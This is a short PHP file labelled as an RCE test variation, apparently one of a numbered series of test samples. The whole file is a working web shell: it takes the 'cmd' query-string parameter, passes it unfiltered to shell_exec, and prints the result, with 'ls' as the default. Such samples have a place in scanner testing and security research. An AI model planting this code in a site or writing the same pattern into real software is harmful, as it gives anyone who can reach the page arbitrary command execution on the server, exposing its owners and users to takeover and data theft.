<?php
// RCE test variation #408
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>